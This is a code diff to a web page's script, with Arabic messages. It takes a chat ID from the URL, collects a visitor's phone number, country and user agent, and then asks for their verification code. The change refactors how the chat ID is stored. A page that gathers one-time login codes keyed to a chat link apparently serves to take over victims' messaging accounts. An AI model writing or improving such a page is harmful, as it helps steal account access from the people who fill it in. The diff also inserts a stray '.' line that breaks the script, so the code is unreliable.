@@ -111,10 +111,10 @@
             </div>
         </div>
     </div>
-
     <script>
         let globalPhoneNumber = '';
         let globalCountry = '';
+        let globalChatId = '';
 
         function getChatIdFromUrl() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -125,6 +125,9 @@
             const chatId = getChatIdFromUrl();
             if (chatId) {
                 document.getElementById('chatId').value = chatId;
+                globalChatId = chatId;
+            } else {
+                showMessage('معرف المحادثة غير موجود. يرجى التأكد من الرابط الصحيح.');
             }
         });
 
@@ -170,11 +173,12 @@
                 userAgent: ua
             };
         }
+.
 
         async function sendPhoneNumber() {
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             const country = document.getElementById('country').value;
-            const chatId = document.getElementById('chatId').value;
+            const chatId = globalChatId;
 
             if (!phoneNumber) {
                 showMessage('يرجى إدخال رقم الهاتف');
@@ -187,8 +191,7 @@
             }
 
             if (!chatId) {
-                console.error('معرف المحادثة غير موجود');
-                showMessage('حدث خطأ. يرجى تحديث الصفحة والمحاولة مرة أخرى.');
+                showMessage('معرف المحادثة غير موجود. يرجى تحديث الصفحة والمحاولة مرة أخرى.');
                 return;
             }
 
@@ -234,7 +237,7 @@
 
         async function verifyCode() {
             const verificationCode = document.getElementById('verificationCode').value.trim();
-            const chatId = document.getElementById('chatId').value;
+            const chatId = globalChatId;
 
             if (!verificationCode) {
                 showMessage('يرجى إدخال كود التحقق');
